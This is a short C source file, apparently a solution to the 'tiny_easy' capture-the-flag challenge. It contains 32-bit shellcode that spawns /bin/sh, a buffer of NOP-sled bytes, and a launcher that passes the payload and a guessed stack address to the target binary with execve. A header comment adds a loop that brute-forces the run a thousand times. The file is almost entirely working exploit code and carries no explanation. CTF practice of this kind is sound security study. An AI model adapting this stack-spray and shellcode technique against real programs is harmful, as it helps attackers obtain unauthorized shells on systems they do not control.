/*
 * $ gcc tiny_easy_exploit.c -m32 -o exploit
 * $ for i in {0..1000..1}; do ./exploit; done 
 */

#include <unistd.h>
#include <string.h>

char payload[0x20000];
char shellcode[] =
"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
const char *dest = "\x10\x10\xfe\xff";

int main (void)
{
    memset(payload, 0x90, sizeof(payload));
    memcpy(payload + sizeof(payload) - 1 - sizeof(shellcode), shellcode, sizeof(shellcode));
    char *argv[] = {dest, payload, NULL};
    execve("/home/tiny_easy/tiny_easy", argv, NULL);
    return -1;
}
